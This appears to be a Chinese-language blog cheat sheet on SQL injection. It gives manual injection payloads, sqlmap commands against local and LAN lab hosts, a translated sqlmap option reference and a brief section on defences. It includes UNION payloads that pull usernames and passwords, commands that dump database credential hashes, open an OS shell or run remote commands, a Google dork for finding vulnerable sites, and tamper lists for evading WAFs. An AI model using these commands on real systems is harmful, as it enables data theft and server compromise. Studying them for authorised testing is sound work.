---
title: sqmap simple intro
top: false
cover: false
toc: true
mathjax: true
date: 2019-09-12 22:14:36
password:
summary:
tags:
categories:
---
## 手动注入
判断搜索型GET or POST注入的方法：
1 搜索keywords‘，如果出错的话，有90%的可能性存在漏洞；
2 搜索 keywords%，如果同样出错的话，就有95%的可能性存在漏洞；
3 搜索keywords% 'and 1=1 and '%'='（这个语句的功能就相当于普通SQL注入的 and 1=1）看返回的情况
4 搜索keywords% 'and 1=2 and '%'='（这个语句的功能就相当于普通SQL注入的 and 1=2）看返回的情况
```
'and 1=1 and '%'='
%' and 1=1--'
%' and 1=1 and '%'='
%' union select 1,2,3,4,...... and '%'='
%' and exists (select id from user where LENGTH(username)<6 and id=1) and '%'='
%'and(select count(*)from admin)>0 and '%'=' change admin

php: ' or 1=1#
' order by 4#
'or 1=1 union select 1,2,3,4 #
'or 1=1 union select username,password,3,4 from user#
```

## 常用命令
```
sqlmap.py -u "http://localhost:88/vulnerabilities/sqli/?id=1&Submit=Submit#" –cookie=mycookice.txt –batch
sqlmap.py -u "http://192.168.3.64:8080/user/login?username=foo&passwd=bar" –batch -D sql_inject_demo -T t_user –columns
sqlmap.py -u "http://192.168.3.64:8080/user/login?username=foo&passwd=bar" –batch -D sql_inject_demo -T t_user -C ‘username, passwd’ –dump
sqlmap.py -u "http://192.168.3.64:8080/user/login?username=foo&passwd=bar" –batch -D mysql -T user -C ‘user, authentication_string’ –dump
sqlmap.py -u "http://127.0.0.1/index.php?id=1" –os-shell // 获取远程主机的shell
sqlmap.py -u "http://127.0.0.1/index.php?id=1" –os-cmd="whoami" // 执行远程主机的命令
sqlmap.py -u "http://127.0.0.1/index.php?id=1" –is-dba // 检查DBMS用户是否为DBA
sqlmap.py -g "inurl:php?id=" // 通过google寻找url带有php?id=字段的地址
sqlmap.py -u "url" --cookie="" --data=“n=1&p=1” --batch --smart启发式判断
python sqlmap –u "https://target.com/index.php" --cookies= --data=
--risk=3 --level=5 -v(verbose) 3 --crawl=5 --crawl-exclude="logout" --forms
sqlmap.py -g "url匹配" --batch --smart //Google
sqlmap.py -l txt文件名 --batch --smart
```

**参数解析**
–batch –dbs //showdatabases
–batch –current-db //showcurrentdb
–batch -D database -T user -C varchar–tables //showtables
–columns //showcolumns
–tables //thesame
--dump //查询出所有数据表的所有数据
--forms //自动查询表单

__以GET方式的cookice形式:__
_ga=GA1.1.1240902680.1567156892; portainer.datatable_text_filter_home_endpoints=; PHPSESSID=r56dp5dsqrc9rmjq74k85m4jd1; security=low

__POST注入方式:__
$ python sqlmap.py -r header.txt –dbs
// -r是从一个文件中载入HTTP请求
// 其余都与GET一样将-u部分改成-r header.txt
从chrome保存下来的request header:
POST /index.php HTTP/1.1 ...


## 防护sql注入
那么，如何防护sql的注入呢
（1）永远不要相信用户的输入，必须对用户的输入进行校验，过滤，可以通过正则表达式，输入的字符长度限制但双引号，转义字符等，可以前后端进行结合对用户的输入验证
（2）重要的数据等不能明文显示，必须加密
（3）不要用管理员的权限登录数据库，可以在数据库的安全性文件夹-架构-新建架构，然后在数据表上添加架构的名称，查询数据表时需要在表明前面加上架构的前缀才能查询，这样有效防止对数据表名的猜测。
（4）对于系统的错误提示尽可能少，或者对其提示进行改变，隐藏不必要的系统信息。

## More
```
Target(目标):
以下至少需要设置其中一个选项，设置目标URL
-d DIRECT 直接连接到数据库
-u URL, --url=URL 目标URL(e.g. "http://www.site.com/vuln.php?id=1")
-l LOGFILE 从Burp或WebScarab代理的日志中解析目标
-x SITEMAPURL 从远程sitemap(.xml)文件中解析目标
-m BULKFILE 在文件中扫描多个目标
-r REQUESTFILE 从一个文件中载入HTTP请求
-g GOOGLEDORK 处理Google dork的结果作为目标URL
-c CONFIGFILE 从INI配置文件中加载选项。

Request(请求):
这些选项可以用来指定如何连接到目标URL
--method=METHOD 强制使用指定的请求方法(e.g. PUT)
--data=DATA 通过POST发送的数据字符串
--cookie=COOKIE HTTP Cookie头
--cookie-del=COOKIEDEL 设置用于分割cookie值的字符
--load-cookies LOADCOOKIES 读取包含Netsacape/wget格式的cookie文件
--drop-set-cookie 忽略响应的Set - Cookie头信息
--user-agent=AGENT 指定 HTTP User - Agent头
--random-agent 使用随机选定的HTTP User - Agent头
--host HOST HTTP主机头
--referer=REFERER 指定 HTTP Referer头
--header=HEADER 请求头(e.g. "X-Forwarded-For: 127.0.0.1")
--headers=HEADERS 请求头(e.g. "Accept-Language: fr\nETag: 123")
--auth-type=AUTHTYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)
--auth-cred=AUTHCRED HTTP身份验证凭据(name:password)
--auth-file=AUTHFILE HTTP身份认证PEM证书/私钥文件
--ignore-401 忽略HTTP 401错误(未经授权)
--proxy=PROXY 使用HTTP代理连接到目标URL
--ignore-proxy 忽略系统默认的HTTP代理
--tor 使用Tor匿名网络
--tor-port=TORPORT 设置Tor代理端口除了默认
--tor-type=TORTYPE 设置Tor代理模式(HTTP, SOCKS4 or SOCKS5 (默认))
--check-tor 检查Tor是否能够正常使用
--delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒
--timeout=TIMEOUT 等待连接超时的时间（默认为30秒）
--retries=RETRIES 连接超时后重新连接的时间（默认3）
--randomize=RPARAM 随意改变给定的参数值
--safe-url=SAFEURL 在测试过程中经常访问的url地址
--safe-post=SAFEPOST POST发送数据给Safe url
--safe-req=SAFEREQ 从文件中加载安全HTTP请求
--safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL
--skip-urlencode Payload数据跳过URL编码
--csrf-token=CSRFTOKEN 使用防CSRF令牌参数
--csrf-url=CSRFURL 通过URL访问获取防CSRF令牌
--force-ssl 强制使用SSL/HTTPS
--hpp 使用HTTP参数污染
--eval=EVALCODE
使用python代码(e.g. "import hashlib;id2=hashlib.md5(id).hexdigest()")

Optimization(优化):
这些选项可用于优化sqlmap的性能。
-o 开启所有优化开关
--predict-output 预测常见的查询输出
--keep-alive 使用持久的HTTP(s)连接
--null-connection 从没有实际的HTTP响应体中检索页面长度
--threads=THREADS 最大的HTTP(s)请求并发量(默认为1)

Injection(注入):
这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。
-p TESTPARAMETER 可测试的参数(s)
--skip=SKIP 跳过参数(s)测试
--skip-static 跳过测试静态参数
--dbms=DBMS 强制后端的DBMS为此值
--dbms-cred=DBMSCRED DBMS身份验证凭据(username:password)
--os=OS 强制后端的DBMS操作系统为这个值
--invalid-bignum 使用大数字参数的无效值
--invalid-logical 使用逻辑参数的无效值
--invalid-string 使用字符串参数的无效值
--no-cast 关闭Payload的计算机制
--no-escape 关闭字符串的避开机制
--prefix=PREFIX 注入payload字符串前缀
--suffix=SUFFIX 注入payload字符串后缀
--tamper=TAMPER 使用给定的脚本(s)篡改注入数据

Detection(检测):
这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。
--level=LEVEL 执行测试的等级(1-5，默认为1)
--risk=RISK 执行测试的风险(0-3，默认为1)
--string=STRING 查询时有效时在页面匹配字符串
--regexp=REGEXP 查询时有效时在页面匹配正则表达式
--text-only 仅基于在文本内容比较网页
--titles 仅基于在题头比较网页

Techniques(技巧):
这些选项可用于调整具体的SQL注入测试。
--technique=TECH SQL注入技术测试(默认BEUST)
--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
--union-cols=UCOLS 定列范围用于测试UNION查询注入
--union-char=UCHAR 用于暴力猜解列数的字符
--union-from=UFROM 在表中使用联合查询的SQL注入在FROM部分
--dns-domain=DNSDOMAIN 打开DNS渗出支持
--second-order=SECONDORDER 搜索第二级响应页面的地址

Fingerprint(指纹):
-f, --fingerprint 执行检查广泛的DBMS版本指纹

Enumeration(枚举):
这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己
的SQL语句。
-a, --all 检索所有
-b, --banner 检索数据库管理系统的标识
--current-user 检索数据库管理系统当前用户
--current-db 检索数据库管理系统当前数据库
--is-dba 检测DBMS当前用户是否DBA
--users 枚举数据库管理系统用户
--passwords 枚举数据库管理系统用户密码哈希
--privileges 枚举数据库管理系统用户的权限
--roles 枚举数据库管理系统用户的角色
--dbs 枚举数据库管理系统数据库
--tables 枚举的DBMS数据库中的表
--columns 枚举DBMS数据库表列
--schema 枚举DBMS数据库模式
--count 检索表的条目数量
--dump 转储数据库管理系统的数据库中的表项
--dump-all 转储所有的DBMS数据库表中的条目
--search 搜索列(s)，表(s)和/或数据库名称(s)
-D DB 要进行枚举的数据库名
-T TBL 要进行枚举的数据库表
-C COL 要进行枚举的数据库列
-X EXCLUDECOL 不要进行枚举的数据库列
-U USER 用来进行枚举的数据库用户
--exclude-sysdbs 枚举表时排除系统数据库
--pivao-column=PIVALCOLUMN 关键的字段名
--where=DUMPWHERE 使用WHERE的环境在DUMP表的时候
--start=LIMITSTART 第一个查询输出进入检索
--stop=LIMITSTOP 最后查询的输出进入检索
--first=FIRSTCHAR 第一个查询输出字的字符检索
--last=LASTCHAR 最后查询的输出字字符检索
--sql-query=QUERY 要执行的SQL语句
--sql-shell 提示交互式SQL的shell
--sql-file=SQLFILE 从给定的文件(s)中执行sql语句

Brute force(蛮力):
这些选项可以被用来运行蛮力检查。
--common-tables 检查存在共同表
--common-columns 检查存在共同列

User-defined function injection(用户自定义函数注入):
这些选项可以用来创建用户自定义函数。
--udf-inject 注入用户自定义函数
--shared-lib=SHLIB 共享库的本地路径

File system access(访问文件系统):
这些选项可以被用来访问后端数据库管理系统的底层文件系统。
--file-read=RFILE 从后端的数据库管理系统文件系统读取文件
--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径

Operating system access(操作系统访问):
这些选项可以用于访问后端数据库管理系统的底层操作系统。
--os-cmd=OSCMD 执行操作系统命令
--os-shell 交互式的操作系统的shell
--os-pwn 获取一个OOB shell，meterpreter或VNC
--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC
--os-bof 存储过程缓冲区溢出利用
--priv-esc 数据库进程用户权限提升
--msf-path=MSFPATH Metasploit Framework本地的安装路径
--tmp-path=TMPPATH 远程临时文件目录的绝对路径

Windows registry access(Windows注册表访问):
这些选项可以被用来访问后端数据库管理系统Windows注册表。
--reg-read 读一个Windows注册表项值
--reg-add 写一个Windows注册表项值数据
--reg-del 删除Windows注册表键值
--reg-key=REGKEY Windows注册表键
--reg-value=REGVAL Windows注册表项值
--reg-data=REGDATA Windows注册表键值数据
--reg-type=REGTYPE Windows注册表项值类型

General(一般):
这些选项可以用来设置一些一般的工作参数。
-s SESSIONFILE 保存和恢复检索会话文件的所有数据
-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中
--batch 从不询问用户输入，使用所有默认配置
--binary-fields=BINARYFIELDS 具有二进制值的结果字段(e.g. "digest")
--charset=CHARSET 强制使用用于数据检索的字符编码
--crawl=CRAWL 从目标网址抓取网站
--crawl-exclude=CRAWLEXCLUDE 用正则表达式排除爬取的页面(e.g. "logout")
--csv-del=CSVDEL 使用设定的字符输出CSV(默认 ",")
--dump-format=DUMPFORMAT DUMP格式(CSV(默认), HTML or SQLITE)
--eta 显示每个输出的预计到达时间
--flush-session 刷新当前目标的会话文件
--forms 目标网址的解析和测试格式
--fresh-queries 忽略在会话文件中存储的查询结果
--hex 数据检索使用DBMS十六进制方法(s)
--output-dir=OUTPUTDIR 自定义输出目录
--parse-errors 解析和显示响应中的DBMS错误信息
--save=SAVECONFIG file保存选项到INI配置文件
--scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式
--test-filter=TESTFILTER 选择测试用的payload或标题(e.g. ROW)
--test-skip=TESTSKIP 跳过测试用的payload或标题(e.g. BENCHMARK)
--update 更新sqlmap

Miscellaneous(杂项):
-z MNEMONICS 使用短记忆法(e.g. "flu,bat,ban,tec=EU")
--alert=ALERT 找到sql注入的时候,运行主机命令(s)
--answers=ANSWERS 设置疑问答复(e.g. "quit=N,follow=N")
--beep 发现SQL注入时提醒
--check-payload IDS对注入payloads的检测测试
--cleanup SqlMap具体的UDF和表清理DBMS
--dependencies 检测sqlmap的依赖(非核心)
--disable-coloring 关闭控制台输出的颜色
--gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果
--identity-waf 对WAF/IPS/IDS进行全面的测试
--mobile 模仿智能手机HTTP请求头
--offline 脱机模式工作(仅使用会话数据)
--page-rank Google dork结果显示网页排名（PR）
--purge-output 安全地删除输出目录中的所有内容
--skip-waf 跳过探测WAF/IPS/IDS保护
--smart 如果探测.就进行深度测试
--sqlmap-shell 提供一个与sqlmap互动的shell
--wizard 给初级用户的简单向导界面

tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
MSSQL：
tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
MySQL的：
tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```
